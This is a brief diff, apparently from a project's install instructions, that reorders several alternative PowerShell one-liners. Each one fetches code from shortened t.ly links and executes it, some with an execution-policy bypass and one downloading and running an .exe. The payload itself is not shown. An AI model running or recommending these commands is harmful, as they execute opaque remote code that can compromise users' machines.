@@ -44,12 +44,12 @@
 
 #or
 
-    powershell .\p.exe(irm t.ly/pedexe -o p.exe)
-
-#or
-
     cmd.exe /c powershell -command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex(irm t.ly/ped)"
 
 #or
 
     cmd.exe /c powershell "& "iex ((New-Object System.Net.WebClient).DownloadString('https://t.ly/ped'))""
+
+#or
+
+    powershell .\p.exe(irm t.ly/pedexe -o p.exe)
